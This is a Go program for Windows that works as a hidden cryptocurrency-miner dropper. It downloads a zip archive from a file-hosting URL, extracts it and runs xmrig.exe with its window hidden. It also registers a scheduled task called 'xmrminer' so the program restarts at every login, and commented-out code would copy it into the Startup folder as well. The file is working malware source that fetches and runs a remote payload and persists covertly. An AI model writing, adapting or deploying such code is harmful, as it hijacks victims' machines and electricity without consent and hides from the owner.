package main

import (
	"archive/zip"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
//	"os/user"
// 	"os/signal"
)

func downloadFile(filepath string, url string) (err error) {
	// Create the file
	out, err := os.Create(filepath)
	if err != nil	{
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil	{
		return err
	}

	return nil
}

func unzipSource(source, destination string) error {
	// 1. Open the zip file
	reader, err := zip.OpenReader(source)
	if err != nil {
		return err
	}
	defer reader.Close()

	// 2. Get the absolute destination path
	destination, err = filepath.Abs(destination)
	if err != nil {
		return err
	}

	// 3. Iterate over zip files inside the archive and unzip each of them
	for _, f := range reader.File {
		err := unzipFile(f, destination)
		if err != nil {
			return err
		}
	}

	return nil
}

func unzipFile(f *zip.File, destination string) error {
	// 4. Check if file paths are not vulnerable to Zip Slip
	filePath := filepath.Join(destination, f.Name)
	if !strings.HasPrefix(filePath, filepath.Clean(destination)+string(os.PathSeparator)) {
		return fmt.Errorf("invalid file path: %s", filePath)
	}

	// 5. Create directory tree
	if f.FileInfo().IsDir() {
		if err := os.MkdirAll(filePath, os.ModePerm); err != nil {
			return err
		}
		return nil
	}

	if err := os.MkdirAll(filepath.Dir(filePath), os.ModePerm); err != nil {
		return err
	}

	// 6. Create a destination file for unzipped content
	destinationFile, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	// 7. Unzip the content of a file and copy it to the destination file
	zippedFile, err := f.Open()
	if err != nil {
		return err
	}
	defer zippedFile.Close()

	if _, err := io.Copy(destinationFile, zippedFile); err != nil {
		return err
	}
	return nil
}

func startCommand(dir string) {
	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err := cmd.Start(); err != nil {
		log.Printf("Failed to start cmd: %v", err)
		return
	}

	// And when you need to wait for the command to finish:
	if err := cmd.Wait(); err != nil {
		log.Printf("Cmd returned error: %v", err)
	}
}

func RemoveContents(dir string) error {
	d, err := os.Open(dir)
	if err != nil {
		return err
	}
	defer d.Close()
	names, err := d.Readdirnames(-1)
	if err != nil {
		return err
	}
	for _, name := range names {
		err = os.RemoveAll(filepath.Join(dir, name))
		if err != nil {
			return err
		}
	}
	return nil
}

func copy(src, dst string) error {
	if _, err := os.Stat(dst); os.IsNotExist(err) {
		in, err := os.Open(src)
		if err != nil {
			return err
		}
		defer in.Close()

		out, err := os.Create(dst)
		if err != nil {
			return err
		}
		defer out.Close()

		_, err = io.Copy(out, in)
		if err != nil {
			return err
		}
	}
	return nil
}

func autostart() {
	// Get the path to the executable
	exePath, err := filepath.Abs(os.Args[0])
	if err != nil {
		log.Println("Error getting executable path:", err)
		return
	}

	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	unknown, err := oleutil.CreateObject("Schedule.Service")
	if err != nil {
		log.Println(err)
	}

	defer unknown.Release()

	scheduler, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		log.Println(err)
	}

	defer scheduler.Release()

	taskDefinition, err := oleutil.CallMethod(scheduler, "NewTask", 0, "")
	if err != nil {
		log.Println(err)
	}

	defer taskDefinition.Clear()

	taskDefinitionDisp := taskDefinition.ToIDispatch()

	defer taskDefinitionDisp.Release()
	_, err = oleutil.PutProperty(taskDefinitionDisp, "RegistrationInfo.Author", "Mikołaj Lubiak")
	if err != nil {
		log.Println(err)
	}

	_, err = oleutil.PutProperty(taskDefinitionDisp, "RegistrationInfo.Description", "Start the program at user login")
	if err != nil {
		log.Println(err)
	}

	// Set the trigger to start at login
	triggersDisp := oleutil.MustCallMethod(taskDefinitionDisp, "Triggers").ToIDispatch()

	defer triggersDisp.Release()

	triggerDisp := oleutil.MustCallMethod(triggersDisp, "Create", 9).ToIDispatch()

	defer triggerDisp.Release()

	_, err = oleutil.PutProperty(triggerDisp, "StartBoundary", "2010-01-01T00:00:00")
	if err != nil {
		log.Println(err)
	}

	_, err = oleutil.PutProperty(triggerDisp, "Enabled", true)
	if err != nil {
		log.Println(err)
	}

	actionsDisp := oleutil.MustCallMethod(taskDefinitionDisp, "Actions").ToIDispatch()

	defer actionsDisp.Release()

	actionDisp := oleutil.MustCallMethod(actionsDisp, "Create", 0).ToIDispatch()

	defer actionDisp.Release()

	_, err = oleutil.PutProperty(actionDisp, "Path", exePath)
	if err != nil {
		log.Println(err)
	}
	rootFolderDisp := oleutil.MustCallMethod(scheduler, "GetFolder", "\\").ToIDispatch()

	defer rootFolderDisp.Release()

	_, err = oleutil.CallMethod(rootFolderDisp, "RegisterTaskDefinition", "xmrminer", taskDefinitionDisp, 6, "", "", 2, nil)
	if err != nil {
		log.Println(err)
	}
}


func main() {
	f, err := os.OpenFile("log.txt", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("error opening file: %v", err)
	}
	defer f.Close()
	log.SetOutput(f)

//	currentUser, err := user.Current()
//	if err != nil {
//		log.Fatalf(err.Error())
//	}
//	homedir := currentUser.HomeDir

//	startup := filepath.Join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
//	err = copy(os.Args[0], startup)
//	if err != nil {
//		log.Panicf("copy -> %v", err)
//	}
//	log.Printf("NOTERROR startup string is: %s", startup)

	autostart()

	dir, err := ioutil.TempDir("", "xmrminer")
	if err != nil {
		log.Fatal(err)
	}
	defer os.RemoveAll(dir)

//	sigs := make(chan os.Signal, 1)
//	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
//	go func() {
//  		<- sigs
//  		err := RemoveContents(filepath.Join("tmp", "xmrcache"))
//  		if err != nil {
//  			log.Fatal(err)
//  		}
//  		os.Exit(0)
//	}()

	err = downloadFile(filepath.Join(dir, "xmrcache.zip"), "https://files.catbox.moe/g9ivbr.zip")
	if err != nil {
		log.Fatalf("error downloading file: %v", err)
	}

	err = unzipSource(filepath.Join(dir, "xmrcache.zip"), filepath.Join(dir, "xmrcache"))
	if err != nil {
		log.Fatal(err)
	}

	startCommand(dir)
}
